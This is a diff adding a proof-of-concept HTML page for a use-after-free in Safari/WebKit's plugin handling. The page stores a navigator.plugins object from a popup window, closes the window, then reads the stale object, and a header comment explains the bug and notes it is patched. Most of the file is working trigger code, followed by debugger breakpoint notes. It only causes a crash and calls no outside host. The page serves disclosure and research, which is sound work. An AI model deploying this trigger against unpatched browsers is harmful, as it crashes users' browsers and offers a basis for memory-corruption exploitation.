@@ -1,0 +1,67 @@
+<!-- 
+Shoutout to @CTurtE,@rtgallagh, & @lcamtuf
+
+This has been patched in trunk for quite a while :( (Assert on m_mainframe)
+
+Crash happens here: https://github.com/WebKit/webkit/blob/master/Source/WebKit2/WebProcess/WebCoreSupport/WebPlatformStrategies.cpp#L356
+
+After closing a page, the Safari will attempt to read the data held by the Plugin Object we previously stored. Since there was no check to make sure the frame/page
+was still available, a UAF was triggered. 
+
+Open this page in Safari, then open the developer console. 
+
+You can also trigger via an AJAX call, but that exercise is left up to the reader
+
+-->
+
+<html>
+<head>
+<title>Fuzzing Page</title>
+</head>
+<body>
+<script>
+   var spray_str;
+   var win1;
+   var cur_set=[];
+   var t1;
+
+   doFuzz();
+
+    function openTargets() {
+        t1 = window.open('target2.html', 't2');
+    }
+    function closeTargets() {
+        t1.close();
+    }
+
+    function doFuzz(){
+        openTargets();
+        grabData(t1);
+        closeTargets();
+        recallData(t1);
+    }
+
+    function grabData(target){
+        cur_set.push(target.navigator.plugins[0]);
+    }
+
+    function recallData(target){
+        var data=cur_set[0];
+        document.write(JSON.stringify(data));
+        console.log(data);
+        console.log("done");
+    }
+
+/*
+ breakpoint set --name WebKit::WebPlatformStrategies::populatePluginCache
+ breakpoint set --name WebKit::WebPlatformStrategies::getPluginInfo
+ breakpoint set --name WebKit::WebPlatformStrategies::getWebVisiblePluginInfo
+ breakpoint set --name WebCore::PluginData::getWebVisibleMimesAndPluginIndices
+ breakpoint set --name WebCore::DOMPlugin::canGetItemsForName
+ breakpoint set --name WebCore::JSDOMPlugin::canGetItemsForName
+ breakpoint set --name WebCore::JSDOMPlugin::getOwnPropertySlot
+ */
+
+</script>
+</body></html>
+
